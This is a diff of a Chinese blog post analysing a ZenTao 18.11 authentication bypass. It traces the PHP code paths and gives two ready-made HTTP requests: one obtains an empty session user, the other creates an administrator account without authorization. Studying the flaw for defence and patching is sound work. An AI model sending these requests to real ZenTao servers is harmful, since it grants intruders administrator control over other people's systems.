@@ -53,7 +53,7 @@
 
 <meta name="generator" content="Hexo 7.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-</head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
 <body>
@@ -124,17 +124,6 @@
       <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
       
       <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -236,17 +225,6 @@
         
         <li class="m-nav-item">
 	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/friends" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-address-book"></i>
@@ -326,7 +304,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    1.8k
                 </div>
                 
 
@@ -337,6 +315,9 @@
         </div>
         <hr class="clearfix">
 
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
         
 
         
@@ -358,61 +339,109 @@
 </blockquote>
 <p>本文将使用禅道项目管理系统 18.11（开源版）对该漏洞进行分析。</p>
 <h3 id="原因一"><a href="#原因一" class="headerlink" title="原因一"></a>原因一</h3><p>系统在module/common/model.php中common类（继承commonModel类）的deny方法对未登录用户做了个处理：</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;session-&gt;<span class="title function_ invoke__">set</span>(<span class="string">'user'</span>, <span class="variable">$user</span>);</span><br></pre></td></tr></tbody></table></figure>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">session</span><span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 
-<p><img src="/assets/attach-593776b1b1788a1712c0aecf726a4fb5c3643f28.png" alt="image.png"></p>
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-593776b1b1788a1712c0aecf726a4fb5c3643f28.png" alt="image.png"></p>
 <p>其中传参$reload不能是false，而<code>$user</code>由<code>$this-&gt;app-&gt;user</code>赋值而来，<code>$this-&gt;app</code>是api类的实例，关键代码在www/api.php中，如下：</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Instance the app. */</span>  </span><br><span class="line"><span class="variable">$app</span> = router::<span class="title function_ invoke__">createApp</span>(<span class="string">'pms'</span>, <span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)), <span class="string">'api'</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/* Run the app. */</span>  </span><br><span class="line"><span class="variable">$common</span> = <span class="variable">$app</span>-&gt;<span class="title function_ invoke__">loadCommon</span>();</span><br></pre></td></tr></tbody></table></figure>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">/* Instance the app. */</span>  
+<span class="token variable">$app</span> <span class="token operator">=</span> <span class="token class-name static-context">router</span><span class="token operator">::</span><span class="token function">createApp</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pms'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'api'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">/* Run the app. */</span>  
+<span class="token variable">$common</span> <span class="token operator">=</span> <span class="token variable">$app</span><span class="token operator">-&gt;</span><span class="token function">loadCommon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 
 <p>跟进<code>$app-&gt;loadCommon();</code>来到module/common/model.php中commonModel类的setUser方法，该方法会判断<code>$_SESSION['user']</code>是否为空，若不为空则读取<code>$_SESSION['user']</code>并赋值给<code>$this-&gt;app-&gt;user</code>，若为空则进一步判断是否为guest用户，不为guest用户则跳过。</p>
-<p><img src="/assets/attach-d1c57a84243351e67beba44949118d91b641c3a6.png" alt="image.png"></p>
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-d1c57a84243351e67beba44949118d91b641c3a6.png" alt="image.png"></p>
 <p>当未登录的用户访问时，<code>$this-&gt;app-&gt;user</code>为空，经过一系列调用后，session会话创建了一个空用户<code>$_SESSION['user']</code></p>
-<p><img src="/assets/attach-0253e41ae69f6f7c9c0d4e77057b0b6b076e3c36.png" alt="image.png"></p>
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-0253e41ae69f6f7c9c0d4e77057b0b6b076e3c36.png" alt="image.png"></p>
 <p>值得注意的是config/config.php配置文件中修改Session的会话ID（默认为PHPSESSID）为zentaosid，所以在构造payload的时候应该是Cookie: zentaosid=xxxxxx这种形式。</p>
 <h3 id="原因二"><a href="#原因二" class="headerlink" title="原因二"></a>原因二</h3><p>系统在framework/api/entry.class.php中entry类的checkPriv方法对未授权用户做了一个处理：</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">send</span>(<span class="number">403</span>, <span class="keyword">array</span>(<span class="string">'error'</span> =&gt; <span class="string">'Access not allowed'</span>));</span><br></pre></td></tr></tbody></table></figure>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'Access not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 
-<p><img src="/assets/attach-21dcff093ec04f8566fa3b2c3c94649485afd784.png" alt="image.png"></p>
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-21dcff093ec04f8566fa3b2c3c94649485afd784.png" alt="image.png"></p>
 <ul>
 <li><code>$this-&gt;loadModel('common')-&gt;isOpenMethod($module, $method)</code>判断控制器的对象(<code>$module</code>)和方法(<code>$method</code>)是否是开放的（可不经授权调用），如果是开放的则返回true，否则返回false</li>
 <li><code>commonModel::hasPriv($module, $method)</code>判断用户是否拥有权限访问<code>$module</code>的<code>$method</code>方法，若有权限则返回true，无权限则返回false</li>
 </ul>
 <p>该方法是用来对已登录用户请求的API做鉴权处理的，未登录用户或访客用户在entry实例化的时候会返回401状态码并抛出EndResponseException终止程序的运行，关键代码如下：</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entry</span> <span class="keyword">extends</span> <span class="title">baseEntry</span>  </span></span><br><span class="line"><span class="class"></span>{  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>{  </span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;app-&gt;action == <span class="string">'options'</span>) <span class="keyword">throw</span> <span class="title class_">EndResponseException</span>::<span class="title function_ invoke__">create</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">send</span>(<span class="number">204</span>));  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;app-&gt;user) <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;app-&gt;user-&gt;account == <span class="string">'guest'</span>) <span class="keyword">throw</span> <span class="title class_">EndResponseException</span>::<span class="title function_ invoke__">create</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">sendError</span>(<span class="number">401</span>, <span class="string">'Unauthorized'</span>));  </span><br><span class="line">  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dao = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadModel</span>(<span class="string">'common'</span>)-&gt;dao;  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">entry</span> <span class="token keyword">extends</span> <span class="token class-name">baseEntry</span>  
+<span class="token punctuation">{</span>  
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  
+    <span class="token punctuation">{</span>  
+        <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span><span class="token operator">-&gt;</span><span class="token property">action</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'options'</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token class-name static-context">EndResponseException</span><span class="token operator">::</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token number">204</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span><span class="token operator">-&gt;</span><span class="token property">user</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span><span class="token operator">-&gt;</span><span class="token property">user</span><span class="token operator">-&gt;</span><span class="token property">account</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token class-name static-context">EndResponseException</span><span class="token operator">::</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Unauthorized'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  
+        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dao</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">loadModel</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'common'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token property">dao</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">}</span>  
+<span class="token punctuation">}</span></code></pre>
 <p>跟进<code>$this-&gt;send(403, array('error' =&gt; 'Access not allowed'));</code></p>
-<p><img src="/assets/attach-57d0f99d93d33042064f03ac83a69aa1495296bc.png" alt="image.png"></p>
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-57d0f99d93d33042064f03ac83a69aa1495296bc.png" alt="image.png"></p>
 <p>该方法只是规定了响应的数据包，而return不是在控制器里使用的，这并不影响程序继续执行</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="创建空用户"><a href="#创建空用户" class="headerlink" title="创建空用户"></a>创建空用户</h3><p>系统是通过链式操作调用的deny方法，全局搜索<code>$this-&gt;loadModel('common')-&gt;deny(</code></p>
-<p><img src="/assets/attach-61d3783bda5f98672f8e771355513e0a7dd8e4b3.png" alt="image.png"></p>
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-61d3783bda5f98672f8e771355513e0a7dd8e4b3.png" alt="image.png"></p>
 <p>传入deny方法第三个参数不能为false，满足条件的只有module/testcase/control.php中testcase类的三个方法（showXmindImport、saveXmindImpor和getXmindImport），这个类在实例化时调用了<code>helper::isAjaxRequest()</code>，代码如下：</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjaxRequest</span>(<span class="params">?<span class="keyword">string</span> <span class="variable">$type</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="variable">$isAjax</span> = (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_REQUESTED_WITH'</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_REQUESTED_WITH'</span>] === <span class="string">'XMLHttpRequest'</span>) || (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'HTTP_X_REQUESTED_WITH'</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">'HTTP_X_REQUESTED_WITH'</span>] === <span class="string">'XMLHttpRequest'</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$isAjax</span> === <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> === <span class="string">'zin'</span>)   <span class="keyword">return</span> <span class="title function_ invoke__">array_key_exists</span>(<span class="string">'HTTP_X_ZIN_OPTIONS'</span>, <span class="variable">$_SERVER</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> === <span class="string">'modal'</span>) <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_ZUI_MODAL'</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_ZUI_MODAL'</span>] == <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$type</span> === <span class="string">'fetch'</span>) <span class="keyword">return</span> !<span class="title function_ invoke__">array_key_exists</span>(<span class="string">'HTTP_X_ZIN_OPTIONS'</span>, <span class="variable">$_SERVER</span>) &amp;&amp; !(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_ZUI_MODAL'</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_ZUI_MODAL'</span>] == <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$isAjax</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">isAjaxRequest</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token keyword type-hint">string</span> <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
+<span class="token punctuation">{</span>
+    <span class="token variable">$isAjax</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_REQUESTED_WITH'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_REQUESTED_WITH'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'XMLHttpRequest'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_REQUESTED_WITH'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_REQUESTED_WITH'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'XMLHttpRequest'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isAjax</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'zin'</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'HTTP_X_ZIN_OPTIONS'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'modal'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_ZUI_MODAL'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_ZUI_MODAL'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'fetch'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'HTTP_X_ZIN_OPTIONS'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_ZUI_MODAL'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_ZUI_MODAL'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">return</span> <span class="token variable">$isAjax</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
 <p>如果判断不是Ajax请求，就返回false，所以可以构造如下数据包获取一个空用户</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /api.php?m=testcase&amp;f=getxmindimport HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cookie: zentaosid=qyg;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<pre class="language-none"><code class="language-none">GET /api.php?m=testcase&amp;f=getxmindimport HTTP/1.1
+Host: 127.0.0.1
+Cookie: zentaosid=qyg;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54
+X-Requested-With: XMLHttpRequest
+Connection: close
 
-<p><img src="/assets/attach-19f66d0d8d3015f3930fb29b96544cbf7823327a.png" alt="image.png"></p>
+</code></pre>
+
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-19f66d0d8d3015f3930fb29b96544cbf7823327a.png" alt="image.png"></p>
 <h3 id="调用API"><a href="#调用API" class="headerlink" title="调用API"></a>调用API</h3><p>entry类的checkPriv方法是通过自己的loadController方法调用的，如下：</p>
-<p><img src="/assets/attach-df0d3f3b5380499e1645c1dd52b8f2cdd33b2ba9.png" alt="image.png"></p>
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-df0d3f3b5380499e1645c1dd52b8f2cdd33b2ba9.png" alt="image.png"></p>
 <p>这个方法是API接口用来加载禅道控制器的，全局搜索<code>-&gt;loadController(</code>查看可调用的接口有哪些</p>
-<p><img src="/assets/attach-edebfbd4cc3da75c3a7d6221ce8aa6a9a7027522.png" alt="image.png"></p>
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-edebfbd4cc3da75c3a7d6221ce8aa6a9a7027522.png" alt="image.png"></p>
 <p>api/v1/entries/users.php中usersEntry类的post方法调用了该方法来加载user模型，接着又调用了创建用户的方法<code>$control-&gt;create();</code></p>
-<p><img src="/assets/attach-8d12849ae14aa2f4606b819abc41c85fde72292e.png" alt="image.png"></p>
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-8d12849ae14aa2f4606b819abc41c85fde72292e.png" alt="image.png"></p>
 <p>至此，我们可以根据代码构造数据包，未授权创建一个管理员用户</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /api.php/v1/users HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cookie: zentaosid=qyg;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 80</span><br><span class="line"></span><br><span class="line">{"account":"qyg","password":"Qyg123456","realname":"qyg","role":"","group":"1"}</span><br></pre></td></tr></tbody></table></figure>
+<pre class="language-none"><code class="language-none">POST /api.php/v1/users HTTP/1.1
+Host: 127.0.0.1
+Cookie: zentaosid=qyg;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54
+X-Requested-With: XMLHttpRequest
+Connection: close
+Content-Length: 80
 
-<p><img src="/assets/attach-e703abc0c93dda1b2eb6679595547ed8bb80c69d.png" alt="image.png"></p>
+{"account":"qyg","password":"Qyg123456","realname":"qyg","role":"","group":"1"}</code></pre>
+
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-e703abc0c93dda1b2eb6679595547ed8bb80c69d.png" alt="image.png"></p>
 <p>登录后台查看</p>
-<p><img src="/assets/attach-5563ea43bbc42d58ae95757293bc7431d6d791b3.png" alt="image.png"></p>
+<p><img src="/2024/05/24/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-QVD-2024-15263/attach-5563ea43bbc42d58ae95757293bc7431d6d791b3.png" alt="image.png"></p>
 <p>当然，还可以未授权删除用户，这里删除刚刚创建的用户，id是37</p>
